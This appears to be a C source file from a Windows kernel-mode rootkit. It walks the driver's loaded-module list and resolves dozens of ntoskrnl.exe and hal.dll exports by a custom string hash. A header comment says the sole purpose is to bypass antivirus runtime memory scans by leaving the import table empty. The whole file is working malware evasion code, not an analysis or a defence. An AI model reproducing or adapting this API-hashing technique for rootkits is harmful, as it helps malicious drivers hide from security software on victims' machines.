#include "common.h"


///*//////////////////////////////////////////////////
///
///		File: Hash.c
///
///		Associate function address with a hash
///		with the only purpose of bypass av runtime
///		memory scan, since IAT (Import Address Table)
///		will be empty
///
///*////////////////////////////////////////////////////


VOID KiLoadFunctions(PROOTKIT_API_HASH Hash)
{
	Hash->ntoskrnlexe = NULL;
	Hash->HalDll = NULL;

	/// Get NtosKrnl.exe module address
	/// and load functions with corresponding hash offset


	Hash->ntoskrnlexe = KiGetModuleHandle(L"ntoskrnl.exe");
	if (Hash->ntoskrnlexe != NULL)
	{
		/// Rtl
		Hash->_RtlInitUnicodeString = (fnRtlInitUnicodeString)KiResolveAddress(Hash->ntoskrnlexe, HASH_RtlInitUnicodeString);
		Hash->_RtlInitAnsiString = (fnRtlInitAnsiString)KiResolveAddress(Hash->ntoskrnlexe, HASH_RtlInitAnsiString);
		Hash->_RtlTimeToTimeFields = (fnRtlTimeToTimeFields)KiResolveAddress(Hash->ntoskrnlexe, HASH_RtlTimeToTimeFields);
		Hash->_RtlRandomEx = (fnRtlRandomEx)KiResolveAddress(Hash->ntoskrnlexe, HASH_RtlRandomEx);
		Hash->_RtlAnsiStringToUnicodeString = (fnRtlAnsiStringToUnicodeString)KiResolveAddress(Hash->ntoskrnlexe, HASH_RtlAnsiStringToUnicodeString);
		Hash->_RtlFreeUnicodeString = (fnRtlFreeUnicodeString)KiResolveAddress(Hash->ntoskrnlexe, HASH_RtlFreeUnicodeString);

		/// Io & Iof
		
		Hash->_IofCallDriver = (fnIofCallDriver)KiResolveAddress(Hash->ntoskrnlexe, HASH_IofCallDriver);
		Hash->_IoFreeIrp = (fnIoFreeIrp)KiResolveAddress(Hash->ntoskrnlexe, HASH_IoFreeIrp);
		Hash->_IoFreeMdl = (fnIoFreeMdl)KiResolveAddress(Hash->ntoskrnlexe, HASH_IoFreeMdl);
		Hash->_IoAllocateMdl = (fnIoAllocateMdl)KiResolveAddress(Hash->ntoskrnlexe, HASH_IoAllocateMdl);
		Hash->_IoGetRelatedDeviceObject = (fnIoGetRelatedDeviceObject)KiResolveAddress(Hash->ntoskrnlexe, HASH_IoGetRelatedDeviceObject);
		Hash->_IoAllocateIrp = (fnIoAllocateIrp)KiResolveAddress(Hash->ntoskrnlexe, HASH_IoAllocateIrp);
		Hash->_IoCreateFileEx = (fnIoCreateFileEx)KiResolveAddress(Hash->ntoskrnlexe, HASH_IoCreateFileEx);
		Hash->_IoGetCurrentProcess = (fnIoGetCurrentProcess)KiResolveAddress(Hash->ntoskrnlexe, HASH_IoGetCurrentProcess);
		Hash->_IoGetConfigurationInformation = (fnIoGetConfigurationInformation)KiResolveAddress(Hash->ntoskrnlexe, HASH_IoGetConfigurationInformation);
		Hash->_IoBuildDeviceIoControlRequest = (fnIoBuildDeviceIoControlRequest)KiResolveAddress(Hash->ntoskrnlexe, HASH_IoBuildDeviceIoControlRequest);
		Hash->_IoFileObjectType = (fnIoFileObjectType)KiResolveAddress(Hash->ntoskrnlexe, HASH_IoFileObjectType);
		Hash->_IoAttachDevice = (fnIoAttachDevice)KiResolveAddress(Hash->ntoskrnlexe, HASH_IoAttachDevice);
		Hash->_IoCreateDevice = (fnIoCreateDevice)KiResolveAddress(Hash->ntoskrnlexe, HASH_IoCreateDevice);
		
		/// Mm
		
		Hash->_MmAllocateMappingAddress = (fnMmAllocateMappingAddress)KiResolveAddress(Hash->ntoskrnlexe, HASH_MmAllocateMappingAddress);
		Hash->_MmFreeMappingAddress = (fnMmFreeMappingAddress)KiResolveAddress(Hash->ntoskrnlexe, HASH_MmFreeMappingAddress);
		Hash->_MmIsAddressValid = (fnMmIsAddressValid)KiResolveAddress(Hash->ntoskrnlexe, HASH_MmIsAddressValid);
		Hash->_MmAllocatePagesForMdlEx = (fnMmAllocatePagesForMdlEx)KiResolveAddress(Hash->ntoskrnlexe, HASH_MmAllocatePagesForMdlEx);
		Hash->_MmFreePagesFromMdl = (fnMmFreePagesFromMdl)KiResolveAddress(Hash->ntoskrnlexe, HASH_MmFreePagesFromMdl);
		Hash->_MmMapLockedPagesWithReservedMapping = (fnMmMapLockedPagesWithReservedMapping)KiResolveAddress(Hash->ntoskrnlexe, HASH_MmMapLockedPagesWithReservedMapping);
		Hash->_MmUnmapReservedMapping = (fnMmUnmapReservedMapping)KiResolveAddress(Hash->ntoskrnlexe, HASH_MmUnmapReservedMapping);
		Hash->_MmProbeAndLockPages = (fnMmProbeAndLockPages)KiResolveAddress(Hash->ntoskrnlexe, HASH_MmProbeAndLockPages);
		Hash->_MmUnlockPages = (fnMmUnlockPages)KiResolveAddress(Hash->ntoskrnlexe, HASH_MmUnlockPages);
		Hash->_MmMapLockedPagesSpecifyCache = (fnMmMapLockedPagesSpecifyCache)KiResolveAddress(Hash->ntoskrnlexe, HASH_MmMapLockedPagesSpecifyCache);
		Hash->_MmUnmapLockedPages = (fnMmUnmapLockedPages)KiResolveAddress(Hash->ntoskrnlexe, HASH_MmUnmapLockedPages);
		Hash->_MmIsThisAnNtAsSystem = (fnMmIsThisAnNtAsSystem)KiResolveAddress(Hash->ntoskrnlexe, HASH_MmIsThisNtAsSystem);
		Hash->_MmBuildMdlForNonPagedPool = (fnMmBuildMdlForNonPagedPool)KiResolveAddress(Hash->ntoskrnlexe, HASH_MmBuildMdlForNonPagedPool);
		Hash->_MmGetSystemRoutineAddress = (fnMmGetSystemRoutineAddress)KiResolveAddress(Hash->ntoskrnlexe, HASH_MmGetSystemRoutineAddress);

		/// Ob		
		
		Hash->_ObReferenceObjectByHandle = (fnObReferenceObjectByHandle)KiResolveAddress(Hash->ntoskrnlexe, HASH_ObReferenceObjectByHandle);
		Hash->_ObfDereferenceObject = (fnObfDereferenceObject)KiResolveAddress(Hash->ntoskrnlexe, HASH_ObfDereferenceObject);
		Hash->_ObOpenObjectByPointer = (fnObOpenObjectByPointer)KiResolveAddress(Hash->ntoskrnlexe, HASH_ObOpenObjectByPointer);
		
		/// Ps		
		
		Hash->_PsCreateSystemThread = (fnPsCreateSystemThread)KiResolveAddress(Hash->ntoskrnlexe, HASH_PsCreateSystemThread);
		Hash->_PsLookupProcessByProcessId = (fnPsLookupProcessByProcessId)KiResolveAddress(Hash->ntoskrnlexe, HASH_PsLookupProcessByProcessId);
		Hash->_PsGetVersion = (fnPsGetVersion)KiResolveAddress(Hash->ntoskrnlexe, HASH_PsGetVersion);
		Hash->_PsTerminateSystemThread = (fnPsTerminateSystemThread)KiResolveAddress(Hash->ntoskrnlexe, HASH_PsTerminateSystemThread);
		Hash->_PsGetThreadId = (fnPsGetThreadId)KiResolveAddress(Hash->ntoskrnlexe, HASH_PsGetThreadId);
		Hash->_PsIsProtectedProcess = (fnPsIsProtectedProcess)KiResolveAddress(Hash->ntoskrnlexe, HASH_PsIsProtectedProcess);
		Hash->_PsProcessType = (fnPsProcessType)KiResolveAddress(Hash->ntoskrnlexe, HASH_PsProcessType);
		
		/// Kz & Ke
		
		Hash->_KeInitializeEvent = (fnKeInitializeEvent)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeInitializeEvent);
		Hash->_KeWaitForSingleObject = (fnKeWaitForSingleObject)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeWaitForSingleObject);
		Hash->_KeSetEvent = (fnKeSetEvent)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeSetEvent);
		Hash->_KeResetEvent = (fnKeResetEvent)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeResetEvent);
		Hash->_KeClearEvent = (fnKeClearEvent)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeClearEvent);
		Hash->_KeStackAttachProcess = (fnKeStackAttachProcess)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeStackAttachProcess);
		Hash->_KeUnstackDetachProcess = (fnKeUnstackDetachProcess)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeUnstackDetachProcess);
		Hash->_KeQueryActiveGroupCount = (fnKeQueryActiveGroupCount)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeQueryActiveGroupCount);
		Hash->_KeQueryActiveProcessorCount = (fnKeQueryActiveProcessorCount)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeQueryActiveProcessorCount);
		Hash->_KeQueryActiveProcessors = (fnKeQueryActiveProcessors)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeQueryActiveProcessors);
		Hash->_KeQueryInterruptTime = (fnKeQueryInterruptTime)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeQueryInterruptTime);
		Hash->_KeQueryMaximumProcessorCount = (fnKeQueryMaximumProcessorCount)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeQueryMaximumProcessorCount);
		Hash->_KeAcquireGuardedMutex = (fnKeAcquireGuardedMutex)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeAcquireGuardedMutex);
		Hash->_KeReleaseGuardedMutex = (fnKeReleaseGuardedMutex)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeReleaseGuardedMutex);
		Hash->_KeInitializeGuardedMutex = (fnKeInitializeGuardedMutex)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeInitializeGuardedMutex);
		Hash->_KeGetCurrentThread = (fnKeGetCurrentThread)KiResolveAddress(Hash->ntoskrnlexe, HASH_KeGetCurrentThread);

		/// Ex
		
		Hash->_ExAllocatePool = (fnExAllocatePool)KiResolveAddress(Hash->ntoskrnlexe, HASH_ExAllocatePool);
		Hash->_ExAllocatePoolWithTag = (fnExAllocatePoolWithTag)KiResolveAddress(Hash->ntoskrnlexe, HASH_ExAllocatePoolWithTag);
		Hash->_ExFreePoolWithTag = (fnExFreePoolWithTag)KiResolveAddress(Hash->ntoskrnlexe, HASH_ExFreePoolWithTag);
		Hash->_ExAcquireRundownProtection = (fnExAcquireRundownProtection)KiResolveAddress(Hash->ntoskrnlexe, HASH_ExAcquireRundownProtection);
		Hash->_ExReleaseRundownProtection = (fnExReleaseRundownProtection)KiResolveAddress(Hash->ntoskrnlexe, HASH_ExReleaseRundownProtection);
		
		/// Other
		
		Hash->_ZwQueryVolumeInformationFile = (fnZwQueryVolumeInformationFile)KiResolveAddress(Hash->ntoskrnlexe, HASH_ZwQueryVolumeInformationFile);
		Hash->_ZwQueryDefaultLocale = (fnZwQueryDefaultLocale)KiResolveAddress(Hash->ntoskrnlexe, HASH_ZwQueryDefaultLocale);
		Hash->_ZwQueryDefaultUILanguage = (fnZwQueryDefaultUILanguage)KiResolveAddress(Hash->ntoskrnlexe, HASH_ZwQueryDefaultUILanguage);
		Hash->_ZwOpenFile = (fnZwOpenFile)KiResolveAddress(Hash->ntoskrnlexe, HASH_ZwOpenFile);
		Hash->_ZwQuerySystemInformation = (fnZwQuerySystemInformation)KiResolveAddress(Hash->ntoskrnlexe, HASH_ZwQuerySystemInformation);
		Hash->_sprintf_s = (fnsprintf_s)KiResolveAddress(Hash->ntoskrnlexe, HASH_sprintf_s);
		Hash->_strlen = (fnstrlen)KiResolveAddress(Hash->ntoskrnlexe, HASH_strlen);
		Hash->_strcat = (fnstrcat)KiResolveAddress(Hash->ntoskrnlexe, HASH_strcat);
		Hash->_ZwOpenProcess = (fnZwOpenProcess)KiResolveAddress(Hash->ntoskrnlexe, HASH_ZwOpenProcess);
		Hash->_strcpy_s = (fnstrcpy_s)KiResolveAddress(Hash->ntoskrnlexe, HASH_strcpy_s);
		Hash->_memset = (fnmemset)KiResolveAddress(Hash->ntoskrnlexe, HASH_memset);
	}

	/// Get Hal.dll module address

	Hash->HalDll = KiGetModuleHandle(L"hal.dll");
	if (Hash->HalDll != NULL)
	{
		/// Ke & Kf

		Hash->_KfAcquireSpinLock = (fnKfAcquireSpinLock)KiResolveAddress(Hash->HalDll, HASH_KfAcquireSpinLock);
		Hash->_KfReleaseSpinLock = (fnKfReleaseSpinLock)KiResolveAddress(Hash->HalDll, HASH_KfReleaseSpinLock);
		Hash->_KfRaiseIrql = (fnKfRaiseIrql)KiResolveAddress(Hash->HalDll, HASH_KfRaiseIrql);
		Hash->_KeReleaseInStackQueuedSpinLock = (fnKeReleaseInStackQueuedSpinLock)KiResolveAddress(Hash->HalDll, HASH_KeReleaseInStackQueuedSpinLock);
	}

}

PVOID KiGetModuleHandle(IN PWCHAR ModuleName)
{
	PLDR_DATA_TABLE_ENTRY pDataTable = NULL;
	PLDR_DATA_TABLE_ENTRY Buffer = NULL;
	PLIST_ENTRY List = NULL;
	PVOID ModuleBaseAddress = NULL;
	UNICODE_STRING unicode = {0};
	SIZE_T destsize;

	_InitUnicodeString(&unicode, ModuleName);

	pDataTable = (PLDR_DATA_TABLE_ENTRY)g_pDriverObject->DriverSection;
	if (!pDataTable)
		return NULL;

	List = pDataTable->InLoadOrderLinks.Flink;

	while (List != &pDataTable->InLoadOrderLinks)
	{

		Buffer = (PLDR_DATA_TABLE_ENTRY)List;

		if (CompareUnicodeString(&Buffer->BaseDllName, &unicode,TRUE) == 0x00)
		{
			ModuleBaseAddress = Buffer->DllBase;
			break;
		}

		List = List->Flink;
	}

	return ModuleBaseAddress;
}

PVOID KiGetProcAddress(IN PVOID ModuleBase, IN ULONG Hash, IN ULONG Data)
{
	PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)ModuleBase;
	if (ImageDosHeader->e_magic == IMAGE_DOS_SIGNATURE)
	{
		PIMAGE_NT_HEADERS ImageNtHeaders = ((PIMAGE_NT_HEADERS)(RtlOffsetToPointer(ModuleBase, ImageDosHeader->e_lfanew)));
		if (ImageNtHeaders->Signature == IMAGE_NT_SIGNATURE)
		{
			if (ImageNtHeaders->OptionalHeader.DataDirectory[Data].VirtualAddress && Data < ImageNtHeaders->OptionalHeader.NumberOfRvaAndSizes) {
				PIMAGE_EXPORT_DIRECTORY ImageExport = (((PIMAGE_EXPORT_DIRECTORY)(PUCHAR)RtlOffsetToPointer(ModuleBase, ImageNtHeaders->OptionalHeader.DataDirectory[Data].VirtualAddress)));
				if (ImageExport)
				{
					PULONG AddressOfNames = ((PULONG)RtlOffsetToPointer(ModuleBase, ImageExport->AddressOfNames));
					for (ULONG n = 0; n < ImageExport->NumberOfNames; ++n)
					{
						LPSTR Func = ((LPSTR)RtlOffsetToPointer(ModuleBase, AddressOfNames[n]));
						if (KiCryptoHash(Func) == Hash)
						{
							PULONG AddressOfFunctions = ((PULONG)RtlOffsetToPointer(ModuleBase, ImageExport->AddressOfFunctions));
							PUSHORT AddressOfOrdinals = ((PUSHORT)RtlOffsetToPointer(ModuleBase, ImageExport->AddressOfNameOrdinals));

							return ((PVOID)RtlOffsetToPointer(ModuleBase, AddressOfFunctions[AddressOfOrdinals[n]]));

						}
					}
				}
			}
		}
	}
	return NULL;
}

PVOID KiResolveAddress(IN PVOID ModuleBase, IN ULONG Hash)
{
	return KiGetProcAddress(ModuleBase, Hash, 0);
}

UINT32 KiCryptoHash(IN PCHAR Input)
{
	INT Counter = NULL;
	UINT32 Hash = 0, N = 0;
	while ((Counter = *Input++))
	{
		Hash ^= ((N++ & 1) == NULL) ? ((Hash << 5) ^ Counter ^ (Hash >> 1)) :
			(~((Hash << 9) ^ Counter ^ (Hash >> 3)));
	}

	return (Hash & 0x7FFFFFFF);
}